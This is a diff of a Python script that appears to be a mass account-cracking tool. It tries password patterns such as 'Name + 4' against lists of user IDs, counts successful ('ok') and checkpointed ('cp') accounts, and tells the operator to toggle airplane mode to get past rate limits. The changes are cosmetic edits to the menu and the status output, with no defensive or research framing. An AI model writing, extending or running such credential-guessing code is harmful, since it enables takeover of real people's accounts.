@@ -113,15 +113,14 @@ def sarfraz():
     IP = ipm['origin']
     print
     print(' [1] START FILE CLONING')
-    print(' [2] DUMP-MAKE FILE')
-    print(' [3] EXIT ')
+    print(' [2] EXIT')
     print('')
     _sarfraz___ = input(' [?] CHOOSE OPTION : ')
     if _sarfraz___ in ('1', '01'):
         __xxx__().sarfrazx(id)
-    if _sarfraz___ in ('2', '02'):
+    if _sarfraz___ in ('0', '00'):
         os.system('python dm.py')
-    if _sarfraz___ in ('3', '03'):
+    if _sarfraz___ in ('2', '02'):
         pass
 
 
@@ -150,7 +149,7 @@ class __xxx__:
             self.sarfrazx(id)
     def __metode__(self, user, __chi__, cebok):
         global ok,cp,loop
-        sys.stdout.write(f"\r\x1b[1;92m[PSYCHO] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
+        sys.stdout.write(f"\r\x1b[1;97m PICCHI / {loop}|{len(self.id)} ok- {len(ok)} / cp- {len(cp)} ")
         sys.stdout.flush()
         try:
             for pw in __chi__:
@@ -278,7 +277,7 @@ class __xxx__:
             p4 = input('  Name + 4 : ')
             os.system("clear")
             print(logo)
-            print("\033[1;31m\rUSE FLIGHT (airplane) MODE BEFORE USE\033[1;32m")
+            print("\033[1;36m\rUSE FLIGHT (airplane) MODE ON\033[1;32m")
             print(50*"-")
             print('\033[1;32mTOTAL IDS : %s ' % len(self.id))
             print('\033[1;32mCRACKING STARTED.....')
